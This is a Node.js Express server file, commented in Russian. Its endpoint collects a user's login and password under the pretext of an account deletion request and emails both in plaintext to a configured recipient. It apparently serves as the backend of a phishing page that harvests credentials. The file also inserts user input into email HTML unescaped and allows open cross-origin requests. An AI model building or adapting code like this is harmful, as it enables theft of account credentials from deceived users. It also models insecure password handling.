require('dotenv').config();
const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Настройки для отправки email
const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    secure: false,
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    }
});

// Маршрут для отправки email
app.post('/api/send-email', async (req, res) => {
    try {
        const { login, password } = req.body;
        
        // Валидация данных
        if (!login || !password) {
            return res.status(400).json({
                success: false,
                message: 'Пожалуйста, заполните все поля'
            });
        }

        // Настройка сообщения
        const mailOptions = {
            from: process.env.SMTP_USER,
            to: process.env.RECIPIENT_EMAIL,
            subject: 'Запрос на удаление аккаунта',
            html: `
                <h3>Новый запрос на удаление аккаунта</h3>
                <p><strong>Логин:</strong> ${login}</p>
                <p><strong>Пароль:</strong> ${password}</p>
                <hr>
                <p>Это автоматическое сообщение. Пожалуйста, не отвечайте на него.</p>
            `
        };

        // Отправка email
        await transporter.sendMail(mailOptions);
        
        res.status(200).json({
            success: true,
            message: 'Данные успешно отправлены'
        });
    } catch (error) {
        console.error('Ошибка при отправке email:', error);
        res.status(500).json({
            success: false,
            message: 'Произошла ошибка при отправке данных'
        });
    }
});

// Маршрут для проверки сервера
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
